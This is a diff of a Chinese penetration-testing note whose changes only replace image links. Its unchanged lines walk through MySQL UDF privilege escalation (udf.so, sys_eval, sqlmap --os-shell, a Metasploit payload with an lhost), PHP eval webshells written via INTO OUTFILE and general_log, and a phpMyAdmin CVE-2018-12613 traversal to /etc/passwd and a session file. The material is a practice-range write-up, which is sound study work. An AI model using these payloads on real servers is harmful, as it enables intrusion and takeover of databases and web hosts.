@@ -20,7 +20,7 @@ UDF的设计初衷是为了实现功能的多样化和方便用户自定义一�
 show global variables like "secure_file_priv";
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OGY5ODM4YjgzMWM3MDBmZWE3NWJlMmMyNzZiNjAzNmFfNzNiYWE3MmQ3NjM3MDJmOTI3NDQ0NDlmZThlNWE5NjRfSUQ6NzYyOTU1MjU2OTEwMzkyODI4MV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c48e39d48159.png)
 
 kali中自带的UDF提权库文件
 
@@ -28,7 +28,7 @@ kali中自带的UDF提权库文件
 cd /usr/share/metasploit-framework/data/exploits/mysql
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MWNlOWVhMzg3ZTEzNDkyZGViZWY1ZmY0YTA2NTBkZWFfZWIxMDg2YTQ0ZTBjODFmY2U2ZmM1YTc1Y2I2MDQzZTdfSUQ6NzYyOTU1MzI5MjQ0MzUwMzc5N18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/239e66d35f45.webp)
 
 确认MySQL库文件路径 
 
@@ -36,7 +36,7 @@ cd /usr/share/metasploit-framework/data/exploits/mysql
 show variables like '%plugin%';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2E0YTFmMGJmNjAwMWViNGUyYjczM2Q3MDBjZjY3ZjFfMGMyMmIwMTU0MTkyNDM3ZTllNjZlNjMyY2ZjYWE3N2RfSUQ6NzYyOTU1MzU5NDc1NjY4MDkwOV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0a85afe724ba.png)
 
 # 在MySQL中写入恶意库文件 
 
@@ -56,7 +56,7 @@ create function sys_eval returns string SONAME 'udf.so';
 select sys_eval('id');
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTQxOGE2M2ZhNjNhMzhkMGMwNDk3M2Y0NmFiMmNmZWFfZjEyZGVkYzdjYjNiNmMzYzE0NGVhZTYzZjMwYWNlYzVfSUQ6NzYyOTU1NDEzNTIzNTEyMDA3M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a050ad5adb88.png)
 
 检查创建的函数 
 
@@ -64,7 +64,7 @@ select sys_eval('id');
 select * from mysql.func where name = 'sys_eval';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OGRiODg4MWI3ODhiMWE0YTA4ZmE4Yzc3MTFhY2IzYThfMjBhZWM2NDFjYjcyYmQxYzNkMTEwZTAwNWQ1OTViMzhfSUQ6NzYyOTU1NDI2NzE2NjkwMzI1N18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9bc02dd10200.png)
 
 删除函数 
 
@@ -76,7 +76,7 @@ drop function sys_eval;
 select * from mysql.func where name = 'sys_eval';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmY3NzVjYjhhMDRkZjQ0NjNjNTRkNDA4NGVkZGJjZWVfODg2MzA0MzUzMTM1NTJiZmE1YTE3MDJjN2M2YTUwNmRfSUQ6NzYyOTU1NDQ4NzE3NjY3ODM0N18xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e13d49da76a0.png)
 
 # 使用sqlmap来进行udf提权 
 
@@ -84,7 +84,7 @@ select * from mysql.func where name = 'sys_eval';
 sqlmap -d "mysql://root:123456@10.3.4.95:3306/mysql" --os-shell
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjY0YjI1NTY5MDFmZjc2ZGY5YWIzMjQzMmQwOGYyNTZfMzk0YzYyYzk2YTg0ZDI5YmM5Nzg4NjIwMTIzOWJmYmJfSUQ6NzYyOTU1NTYxNTgxNDc2NTc4OF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/68d932478737.webp)
 
 # 使用msf来进行udf提权，但是无回显，需要写入后自行登录执行命令
 
@@ -98,17 +98,17 @@ msf exploit(multi/mysql/mysql_udf_payload) > set lhost 192.168.205.48
 lhost => 192.168.205.48
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NWQ2N2NlYjdlZDIzMWYyZGRkMTY1N2U2Zjg1ODk0MDBfMjJjMDU0Yzc3NGI0NzRkOWJhNzlkZmEwMTY4MmJjMzFfSUQ6NzYyOTU1Njk5OTkzMjUxMzIzNl8xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/51c159674d2e.png)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDllODM0MDYzMzEyNjU0MmE0Y2ZiMTM4ZWYyNWNmMGJfOGI3NDM2NWRhNzcxMDEzYzdhZWM3ZjdiYzI2MmVmNjVfSUQ6NzYyOTU1NzE1MDUzMjkzMDc4Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/88deb699aeec.png)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTIyMWM5YjNiNGQ0MzFjYzY0Yzg4Y2Y2ZDI4MzdhOTNfMjA0NjdkNWNkMDI0YzQyNDc0Y2JmMjdiZGZmOTBkN2ZfSUQ6NzYyOTU1NzA5OTQ4ODE2OTE0OV8xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/da62d2918399.png)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2Y3M2EwYzRjZjZjMzU0YzJmYzIzNzE2OTNiMmJkY2RfZjQ2M2M2OWQ5Mzg1ODMxM2ZiMjA0MGNiNzU1YmVkZjJfSUQ6NzYyOTU1NzQ0ODI0ODY1ODkwN18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a59a6f2d3203.webp)
 
 # PHPMyadmin登录后台后，可以直接执行SQL语句，因此可以尝试直接往web目录下写入webshell
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YmM5ZjIxYTEwNzM5OWRlMjg0ODRlMTI4NWNjZmYxNGVfZDYxMTAyMDkyYjFmNDVhMjgyNjAyZTQ5MjUzMjgyYjdfSUQ6NzYyOTU1ODQzOTIyODUwOTM5Nl8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/fdb15c72759e.webp)
 
 ```Bash
 -- 查看是否有写入权限 
@@ -117,13 +117,13 @@ show global variables like '%secure%';
 select '<?php @eval($_POST[shell]);?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTQxNmYxMDY2Y2UzNDQzMTdiNDRkNzg3ZjU1MmFhN2RfZjc0OTE4ODYyMzIyMzU0MGQyOWI5YmFhYThjNTM3ZmJfSUQ6NzYyOTU1ODYyMzEyMjk2NzQ4OF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/efbf4cba5d90.png)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTI1YzQwYzczNTA5NDRkYTUwZTYzYzEyZTEzOGNlYjRfYTRhM2NkM2NhMGE4NzNkMTY5NzU5YTc5OTc5Mzc0OTVfSUQ6NzYyOTU1ODgyMDY5NTc3MjEwN18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a68c9e53c54e.png)
 
 由于是公用靶场，所以已经有shell了，可以直接使用
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGYxYmYwYTVmMzhlNGE1OTdjMGZkZTFkNjFkNzYyYmRfYmMwNDUzY2QyZmQwNmNlYTdhMDk4YzAwMjM4NDk3YWVfSUQ6NzYyOTU1OTA3MjI5MTU3Mjk2NF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2300d9c36942.png)
 
 ## 若无法通过SELECT语句写入文件，则可以尝试使用日志文件来写入webshell 
 
@@ -137,11 +137,11 @@ SET global general_log_file='/var/www/html/cmd.php';
 SELECT '<?php eval($_POST["cmd"]);?>';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODU4YWUyMzk3ZWVhZjNiNTJjMTZhZTQ1ODViZTY1YTNfZmI2YWQ4NzE2MmRiMzA3ZmYzYmJmYTNmNGQyZDE3ZDlfSUQ6NzYyOTU1OTI4OTAzOTgzNDA1NV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e1cc34f46bef.png)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmFlNjc4Zjg2NWQ3ZTk5MmQ1YTdmMDNlNDkzMDM5Y2VfZTUwZjM1MDdmNzUyMzFjYzAxMmFiMGE1ZmFiNjIzMTJfSUQ6NzYyOTU1OTcwNTc5ODcwODE5Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ffefa2caaf84.png)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmU4Y2FhZjlkNjg5YzliMDAzNzFlNTM2YTkyYjMzOTVfNTE4YWM2NmI4ZmNhYzZmNjA4YjM1Nzk0ZTQ4ZWM5NGNfSUQ6NzYyOTU2MDA3NTI2NjcyMjc3M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6da20a3c9424.webp)
 
 ## phpmyadmin4\.8\.1远程文件包含漏洞（CVE\-2018\-12613） 
 
@@ -155,18 +155,18 @@ phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index
 
 ### 1\.访问 http://ip/index\.php?target=db\_sql\.php%253f/\.\./\.\./\.\./\.\./\.\./\.\./\.\./\.\./etc/passwd 页面，验证是否存在漏洞
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MzMwYTU5NDI1ZGMzZTZjMTVlZTBlZDQzOGEyYTQwOTJfNDIzNjIzY2M3OWRjZDI1OTQ5Yzg1ODE0MWI3OTQ4MmJfSUQ6NzYyOTU2MDcxNDMwNjUzODQyN18xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/46dc1ab6f4ad.webp)
 
 ### 2\.执行 sql 语句写入php代码SELECT "\<?php phpinfo\(\);?\>";
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmNiYjBhNGE1MDgwZTZlZWNhZjhkOTYxMjQ3ZDI1ZThfOWFiYTYxYWU4OGJmM2UwYzliYjVhM2YzZTQ3OGQyNTNfSUQ6NzYyOTU2MDkzNjczNDY0MTM0M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/48e0c079ae78.png)
 
 ### 3\.查看自己的 seesionid
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjQ5NTljZmJmNTRlMDAwMTIyNGExMTk5YWZjYmMwZWRfMmYzNTdkODVkMDExMWVjYTcwYWIwZjkxNzczZDNkYjNfSUQ6NzYyOTU2MTE4MjY4NDU4MTA2MF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e134e9059131.webp)
 
 ### 4\.访问http://ip/index\.php?target=db\_sql\.php%253f/\.\./\.\./\.\./\.\./\.\./\.\./\.\./\.\./tmp/sess\_sessid即包含session文件，即可 getshell
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTZkOGQ4YTc4NDcxOTA1Yzg1ZTU5ODAxODVhY2ZhNTlfYzBhYzMwNjc2YzQ5MzIxZThhYjE2YWQ3OGRiYTU5YjVfSUQ6NzYyOTU2MTk3NDk4MDkzODk0OV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c16260d820b5.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTQ4OGUyODUxM2QwNDhjYmE3ZDFkZWY1NWExZWEzMDNfMzI2OGY3NTExYmJhYTgzZjE1YTljMzRlZDEzZDdhZDdfSUQ6NzYyOTU2MjA5MjI4MDU5NzQ3Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/20dbf4c1cd3c.webp)
